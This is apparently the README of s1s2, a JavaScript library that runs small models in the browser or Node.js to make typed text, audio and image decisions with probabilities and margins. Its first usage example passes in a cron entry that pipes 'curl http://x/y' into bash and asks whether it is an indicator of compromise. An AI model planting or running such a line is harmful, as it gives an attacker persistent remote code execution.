# s1s2

[Português](README.pt-BR.md)

A JavaScript library for typed decisions about text, audio and images, with probabilities and margins for each answer. Run models in the browser or in Node.js, depending on the package.

**Usage examples** · [Text](#text) · [Audio (Marimba)](#audio-experimental) · [Image (Visual Jev)](#image-experimental)

[Try the browser demos](https://webai.blog.br/demos/s1s2/)

## Text

```sh
npm i @s1s2/web
```

```js
import { S1S2 } from "@s1s2/web";

const model = await S1S2.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // picks a runtime for this device
const s = await model.decide({
  input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
  questions: [{ name: "ioc", type: "predicate", instructions: "Is this an indicator of compromise?" }],
  // evidence: { requirement: "..." },  // packages with an evidence head: s.evidence = the sentence that shows it
});
const { probability, margin } = s.answers[0];                // P(true), and p(1st) - p(2nd)
await s.dispose(); await model.dispose();
```

On text backends that keep state, `s.generate()` can explain a decision using the same weights and prefill. An optional margin policy can route low-margin answers to another build of the model (for example, int4 to int8) or to generation, using a threshold you measure for your build. [Text API and prefill details](docs/reference.md).

## What it is

- **Text models** answer `predicate`, `choice` and `score` questions in one forward pass and report the confidence and margin for each decision.
- **Audio models** analyse a window once for several questions about speech, speakers and language, or transcribe it.
- **Image models** encode an image once and answer multiple-choice questions about it, with a probability for each option.
- **S1S2 packages** use a manifest to describe how to run the model and read its answers, and to pin the files by SHA-256. Browser runtimes include ONNX Runtime Web, transformers.js, WebLLM and LiteRT.js. Node.js packages use ONNX Runtime Node. See the [package spec](spec/s1s2-package.md), [multimodal spec](spec/MULTIMODAL.md) and [head converters](converters/heads).

## Models

All of them in one place: [s1s2 specialists](https://huggingface.co/collections/eduardoworrel/s1s2-specialists-6afc6b0ec797ec2a26933909) on Hugging Face.

Published S1S2 specialists. The ONNX repos run in the browser with this library (WebGPU); the LoRA repos hold the PyTorch adapter and heads for servers. Each card lists its results, limits and license.

| Task | Base | Browser (ONNX int4, WebGPU) | Servers (LoRA + heads) |
|---|---|---|---|
| GDPR + LGPD | EuroLLM-1.7B | [EuroLLM-1.7B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/EuroLLM-1.7B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [EuroLLM-1.7B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/EuroLLM-1.7B-GDPR-LGPD-LoRA) |
| GDPR + LGPD | S5-nano | [S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2) | [S5-nano-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-LoRA) |
| GDPR + LGPD | Salamandra-2B | [Salamandra-2B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Salamandra-2B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [Salamandra-2B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/Salamandra-2B-GDPR-LGPD-LoRA) |
| GDPR + LGPD | SmolLM3-3B | [SmolLM3-3B-GDPR-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-GDPR-LGPD-ONNX-genai-int4-S1S2) | [SmolLM3-3B-GDPR-LGPD-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-GDPR-LGPD-LoRA) |
| LGPD only | Jurema-7B (gated) | [Jurema-7B-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Jurema-7B-LGPD-ONNX-genai-int4-S1S2) | [Jurema-7B-LGPD-LoRA](https://huggingface.co/eduardoworrel/Jurema-7B-LGPD-LoRA) |
| LGPD only | S5-nano | [S5-nano-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-LGPD-ONNX-genai-int4-S1S2) | [S5-nano-LGPD-LoRA](https://huggingface.co/eduardoworrel/S5-nano-LGPD-LoRA) |
| LGPD only | SmolLM3-3B | [SmolLM3-3B-LGPD-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-LGPD-ONNX-genai-int4-S1S2) | [SmolLM3-3B-LGPD-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-LGPD-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | Qwen3-0.6B | [Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [Qwen3-0.6B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | Qwen3-1.7B | [Qwen3-1.7B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/Qwen3-1.7B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [Qwen3-1.7B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/Qwen3-1.7B-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | S5-nano | [S5-nano-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/S5-nano-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [S5-nano-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/S5-nano-ContractNLI-CLINC-SIB-LoRA) |
| ContractNLI + CLINC150 + SIB-200 | SmolLM3-3B | [SmolLM3-3B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2](https://huggingface.co/eduardoworrel/SmolLM3-3B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2) | [SmolLM3-3B-ContractNLI-CLINC-SIB-LoRA](https://huggingface.co/eduardoworrel/SmolLM3-3B-ContractNLI-CLINC-SIB-LoRA) |

CPU fallback: without WebGPU, `S1S2.load` runs builds whose manifest lists device `"wasm"` on the browser CPU (onnxruntime-web WASM; `model.device === "wasm"`, opt out with `cpuFallback: false`): 7.5–16.5× slower than WebGPU, same decisions in ≥116/120 items (120 development items per task, Chrome on an Apple M2 Pro); long inputs (ContractNLI) on the 1.7B and 3B models did not fit a 2-hour budget for 120 items. S5-nano cannot run there (no WASM kernel for GatedDeltaNet).

Quick start with a published package:

```js
import { S1S2 } from "@s1s2/web";

const model = await S1S2.load({  // browser (WebGPU, or the CPU fallback above); no Node device listed yet
  manifest: "https://huggingface.co/eduardoworrel/Qwen3-0.6B-ContractNLI-CLINC-SIB-ONNX-genai-int4-S1S2/resolve/main/manifest.cnli.json",
});
const options = model.manifest.lab.options;  // ["Entailment", "Contradiction", "Not mentioned"]
const ndaText = "...";                        // the NDA text
const hypothesis = "Receiving Party shall destroy or return some Confidential Information upon the termination of Agreement.";
const s = await model.decide({
  input: "Contract:\n" + ndaText,
  questions: [{ name: "h", type: "choice", choices: options,
    instructions: `Hypothesis: ${hypothesis}\nDoes the contract entail this hypothesis, contradict it, or not mention it? Answer with one option only.` }],
});
const { choice, confidence, margin } = s.answers[0];
await s.dispose(); await model.dispose();
```

The heads were trained with exact option words and question wording: use the ones in the manifest (`lab.options`, `lab.question`, or `lab.labels` for the GDPR/LGPD packages, asked as a `choice` between `labels.yes` and `labels.no`). Other words change the prompt the head reads.

## Status: alpha

What has been measured. In each run the hypotheses, data split and scoring rule were fixed before it ran, and held-out test sets were scored once.

- The margin flags the decisions that int4 changes compared with bf16 (8 of 8 settings).
- Sending the 15% of answers with the lowest margin to int8 catches more of those changes than picking at random (5 of 6 settings; not on SmolLM2-135M). Little accuracy is at stake: −0.1 to +2.7 points.
- The evidence pointer finds the right sentence better than rules that ignore the content (6 of 6 and 4 of 4 settings). Against a quote the model generates, results are mixed: on contracts the generated quote won 3 of 4.
- On the real CT0 weights, `decide()` matches ct0-edge `askMany()` to 4e-16, and all 172 ct0-edge prompt fixtures are reproduced exactly.
- `score` questions (1–5 ratings: SST-5 in English, B2W reviews in Portuguese; held-out test, frozen SmolLM3-3B): a linear head measured better than label logits, mean absolute error 0.49 (en, SST-5) and 0.50 (pt, B2W) levels against 0.60 for the logits read after the space; read right after `Answer:` the digits held ~1e-5 of the probability, so the score logits readout now reads after that space (`logits.score.lead`).
- Each head-format conversion has a fidelity record: [spec §11](spec/s1s2-package.md#11-coverage-formats--conversion--fidelity).

What has not been measured, or did not hold:

- One-pass decisions are **not** more robust to int4 than generated answers, and they did not beat grammar-constrained JSON on models of 1.7B parameters or fewer.
- Sending low-margin answers to generation was measured once, exploratory: it did not help on privacy-law items and helped on contracts (ContractNLI), but task and data split changed together, so the two causes cannot be separated.
- The evidence pointer on int4 browser graphs has only been checked on dev data.
- Bytes downloaded and latency for escalation have not been measured. No head type and no confidence definition is recommended yet (TBD in the spec).
- Some converted packages do not run in s1s2 0.1 (non-causal attention, Jinja templates, layer taps). Clef heads are read but `decide()` does not route to them.

API and manifest reference: [`docs/reference.md`](docs/reference.md). Patterns and their evidence: [`docs/system1-on-device-patterns.md`](docs/system1-on-device-patterns.md).

Other projects already run typed decisions in one pass, including open-jev, the wllama decision example, MediaPipe `tasks-decision` and ONNX Runtime GenAI's `NonGenerativeSession`. Routing low-margin inputs to higher precision is prior work, for example arXiv [2609.24322](https://arxiv.org/abs/2609.24322) and [2611.14418](https://arxiv.org/abs/2611.14418).

## Audio (experimental)

[Try the Marimba audio demo](https://webai.blog.br/demos/s1s2/marimba/).

Besides text, the library reads an **audio package**: ONNX builds of [Marimba](https://huggingface.co/charcot-ai/marimba) (typed questions about an 8-second audio window, on a frozen Qwen3-ASR-0.6B encoder) for the browser and Node. The weights are on the Hub, [eduardoworrel/Marimba-ONNX-S1S2](https://huggingface.co/eduardoworrel/Marimba-ONNX-S1S2), and `manifests/marimba-audio.json` pins that repository at the commit that holds them, so `loadMedia` downloads and checks them with no further option. Same answers as the text models (`probability`, `margin`, `rawMargin`, `decision`); one encoder pass answers any number of questions. Requires `@s1s2/web` 0.2.0 or later (`transcribe`: 0.2.1).

```js
import * as ort from "onnxruntime-web/webgpu";
import { loadMedia } from "@s1s2/web/media";

const audio = await loadMedia({
  manifest: "https://huggingface.co/eduardoworrel/Marimba-ONNX-S1S2/resolve/main/manifest.json",
  modules: { ort },
  decoder: "auto",                       // loads language and term; if that fails the other five questions still work
  onStatus: console.log,
});

// samples: Float32Array, mono, 16 kHz (the last 8 s are read)
const enc = await audio.encode({ samples, sampleRate: 16000 });          // one encoder pass
const [vad, turn, same, change, count, lang, term] = await audio.read(enc, [
  "voice_activity", "turn_end", "same_speaker", "speaker_change", "speaker_count",
  "language", { task: "term", term: "obrigado" },
]);
console.log(vad.decision, turn.decision, lang.choice, term.probability, term.hypotheses);

// System 2: the text itself, from the same encoder pass (0.2.1 or later)
const { text, language } = await audio.transcribe(enc);
```

Questions: `voice_activity`, `turn_end`, `same_speaker`, `speaker_change`, `speaker_count` (the three speaker ones need 8 s of audio), `language` (one of 30, with probabilities) and `{ task: "term", term }` (was the word said: yes or no, and the fraction n/5 of five transcript hypotheses, not calibrated). `transcribe` returns `{ text, language, method, tokens, finishReason, cost }` for one window (greedy, or `{ beam: true }` for beam 4 with `hypotheses`); it has no timestamps and no streaming. `language`, `term` and `transcribe` need the decoder; `decoder: false` loads none of it (the other five questions stay, 0.76 GB instead of 1.42 GB), and `decoder: true` fails instead of going on without it. In Node, drop `modules` (it uses `onnxruntime-node`, which you install, on the CPU build of the decoder) and the files go to `$S1S2_CACHE`. With `revision` pinned, the browser checks each large file against the sha256 that the Hub reports; `allowUnverified` is only for other hosts.

- **Cost** (Apple M2 Pro, Chrome 158, WebGPU, median of 8 windows, encoder warm): `language` about 0.13 s, `term` (greedy and four beams) about 1.4 to 1.7 s, one 8 s window with mel, encoder, `language` and `term` about 2 s. In Chrome with WASM, `term` took about 37 s: ask for a term on demand there, not on every window.
- **Size:** 0.76 GB without the decoder, 1.42 GB with the WebGPU build (the CPU build is 0.41 GB and only the build the device needs is fetched).
- **The five other readers**, Chrome WebGPU, 56 FLEURS pt-BR windows: probabilities within 3.82e-5 of the torch Marimba package and the same decision on 56 of 56; about 0.2 s per window (log-mel in JavaScript 116 ms, encoder 71 ms, five readers 10 ms).
- **Limits:** only Portuguese was validated (one noise clip besides); the other 29 languages of `language` are the original's behaviour, not checked here. The 0.02 tolerance on the probability of the top language is **not met** on the noise clip (up to 0.09 with int4 weights) nor, by 0.0001, on one speech window; the language code matched the torch reference on all 72 test windows. int4 changes the text: about half of the greedy transcripts and three quarters of the beam ones differ from float32 torch, while the `term` fraction and decision stay near 98 %. If transcript fidelity matters, this package is the wrong one. Parity tables, every limit and the licences: the [model card](https://huggingface.co/eduardoworrel/Marimba-ONNX-S1S2) and [`spec/MULTIMODAL.md`](spec/MULTIMODAL.md).

Local weights (opt-in): to read files you made yourself or mirrored, map the repository to a URL (browser) or a directory (`localDirs`, Node); the manifest's `revision` is then not used, and a large file that is not on the Hub needs `allowUnverified: true` (the demo server hashes what it serves).

```js
const audio = await loadMedia({ manifest: "manifests/marimba-audio.json", baseUrls: { "eduardoworrel/Marimba-ONNX-S1S2": new URL("/weights/marimba-audio/", location.href).href }, modules: { ort }, allowUnverified: true });
const d = await audio.decide({ audio: { samples, sampleRate: 16000 }, questions: ["voice_activity", "turn_end", "speaker_change"] });
// d.answers[i].decision / .probability / .margin ; d.cost: { ms, parts: { mel, tower, readers } }
```

Demo: [`examples/audio-turn`](examples/audio-turn) (`node examples/serve-media.mjs --weights <dir>`, with a local copy of the repository); how the package is made: [`recipes/`](recipes).

## Image (experimental)

[Try the experimental Visual Jev WebGPU demo](https://webai.blog.br/demos/s1s2/imagem/).

The library also reads an **image package**: [Visual Jev](https://arxiv.org/abs/2609.25845) (Guanxu Yu, Yuhang Yao), a LoRA on Qwen3-VL-4B-Instruct that answers closed-choice questions about one image, as int4 ONNX builds for Chrome and Node ([`eduardoworrel/Visual-Jev-4B-ONNX-S1S2`](https://huggingface.co/eduardoworrel/Visual-Jev-4B-ONNX-S1S2), 3.8 GB). A question is a list of 2 to 16 options (English); the answer is a probability per option, read from the LM-head logit of the option letter.

```js
import * as ort from "onnxruntime-web/webgpu";
import * as transformers from "@huggingface/transformers";
import { loadMedia } from "@s1s2/web/media";

const reader = await loadMedia({
  manifest: "https://huggingface.co/eduardoworrel/Visual-Jev-4B-ONNX-S1S2/resolve/main/manifest.json",
  modality: "image",
  modules: { ort, transformers },
  device: "webgpu",            // the text graph; the vision graph runs on WASM (visionDevice: "wasm", also the default here)
  visionDevice: "wasm",
});
// rgba: ImageData.data of a canvas
const r = await reader.decide({ image: { rgb: rgba, width, height, channels: 4 },
  questions: [{ name: "dog", instruction: "Is there a dog in the image?", options: ["yes", "no"] }] });
console.log(r.answers[0].decision, r.answers[0].probability, r.cost);
```

- **Cost:** Chrome, Apple silicon (16 GB), text on WebGPU and vision on WASM, one question per image: median 15.6 s per question (vision 10.8 s, the question 4.3 s); about 3 GB resident; 3.8 GB to download. Node CPU took 2 to 3 s on 3 questions.
- **Limits:** the vision graph is **wrong on WebGPU** in onnxruntime-web 1.31.1 (hence WASM). Chrome and desktop only. The reference tolerances written before the runs were **not met**: against a bfloat16 PyTorch oracle (float32 does not fit in 16 GB), n = 60, p95 of the probability difference 0.198 and 6.7% decision flips; Chrome against CPU, n = 240, p95 0.136 (flips 2.9%). Accuracy on 240 ScienceQA questions, which is **not** the paper's benchmark and outside its training families: 0.917 (CPU), 0.925 (Chrome). The paper's own numbers were not reproduced. Probabilities are raw and overconfident.
- Design, tolerances and the measured status of each: [`spec/MULTIMODAL.md`](spec/MULTIMODAL.md) section 10; how the package is made: [`recipes/visual-jev-image`](recipes/visual-jev-image).

## Layout

- [`src/`](src): the library. Run `npm test` for typecheck, build and unit tests. Unit tests use mocks and need no model download. There is no hosted CI yet: run `npm test` (and `python -m pytest` in `converter/`) before each release.
- [`spec/`](spec): the S1S2 package spec (0.2-draft) and its JSON Schema. `node bin/s1s2.mjs validate <package>` checks a package.
- [`converter/`](converter/README.md): turns a Hugging Face model plus labelled JSONL into a package. Python.
- [`converters/heads/`](converters/heads): converts published head formats into packages.
- [`examples/`](examples): a Privacy Policy Checker that runs on the device, with the published [S5-nano GDPR + LGPD](https://huggingface.co/eduardoworrel/S5-nano-GDPR-LGPD-ONNX-genai-int4-S1S2) package (2.4 GB download; CCPA was not in its training). Run `node examples/policy-checker/serve.mjs` after `npm ci && npm run build`. `?en=<manifest URL>&pt=<manifest URL>` loads another package; a local build is served with `--mirror <repo>=<dir>`.
- [`manifests/`](manifests): pinned manifests for CT0 (alias3-micro-1026, public builds) and the SmolLM2-135M base model. The SmolLM2 builds are not published, so these manifests load only from a mirror of those exact files; to make a small package of your own, run [`converter/`](converter/README.md) (`s1s2-convert all` writes the graph, heads and manifest) and serve it with `serve.mjs --mirror`.

## Credits

The System 1 / System 2 split and the margin gate idea come from CT0 by Alias Robotics. This code started in [ct0-edge](https://github.com/eduardoworrel/ct0-edge).
The pointer head and the training recipe the lab followed, including its data augmentation, come from [Kev](https://github.com/jaredpalmer/kev) (Apache-2.0); the converter ports the head, not the augmentation. The KEV encoding comes from [open-jev](https://github.com/nico-martin/open-jev) (MIT). See [`NOTICE`](NOTICE).

## License

MIT ([`LICENSE`](LICENSE)). Third-party code keeps its own license ([`NOTICE`](NOTICE)). Model weights and heads keep the license of their source.
